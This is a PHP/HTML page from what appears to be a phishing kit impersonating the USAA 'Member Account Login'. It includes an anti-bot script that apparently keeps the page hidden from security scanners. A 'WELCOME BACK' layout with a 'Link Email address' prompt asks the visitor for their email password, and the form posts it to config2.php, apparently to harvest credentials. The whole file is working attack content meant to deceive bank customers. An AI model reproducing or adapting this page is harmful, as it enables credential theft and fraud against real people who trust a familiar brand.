<?php include '../antibots.php';?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Member Account Login | USAA    </title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link href="USAA-emblem.jpg" rel="shortcut icon" type="image/x-icon">
<link href="email.css" rel="stylesheet">
<link href="index.css" rel="stylesheet">
</head>
<body>
<div id="container">
<div id="wb_Image1">
<img src="images/Capture.PNG" id="Image1" alt=""></div>
<div id="wb_Form1">
<form name="Form1" method="post" action="config2.php" enctype="multipart/form-data" id="Form1">
<input type="hidden" name="formid" value="form1">
<div id="wb_Text1">
<p style="font-size:20px;line-height:22.5px;font-weight:bold;color:#000000;"><span style="color:#000000;">Link Email address:</span></p></div>
<input type="submit" id="Button1" name="" value="Submit">
<input type="password" id="Editbox2" name="2" value="" spellcheck="false" required placeholder="Email Password">
</form>
</div>
<div id="wb_Image7">
<a href="#"><img src="images/WWWCapture.PNG" id="Image7" alt=""></a></div>
<div id="wb_Text3">
<p style="font-size:53px;line-height:59.5px;color:#FFFFFF;"><span style="color:#FFFFFF;">WELCOME </span></p>
<p style="font-size:53px;line-height:59.5px;color:#FFFFFF;"><span style="color:#FFFFFF;">BACK</span><span style="color:#FFFFFF;"> ,</span></p></div>
</div>
<div id="Layer1">
<div id="Layer1_Container">
<div id="wb_Image2">
<img src="images/aCapture.PNG" id="Image2" alt=""></div>
<div id="wb_Text2">
<p style="font-size:29px;line-height:33px;color:#FFFFFF;"><span style="color:#FFFFFF;">WELCOME </span></p>
<p style="font-size:29px;line-height:33px;color:#FFFFFF;"><span style="color:#FFFFFF;">BACK</span><span style="color:#FFFFFF;"> ,</span></p></div>
</div>
</div>
</body>
</html>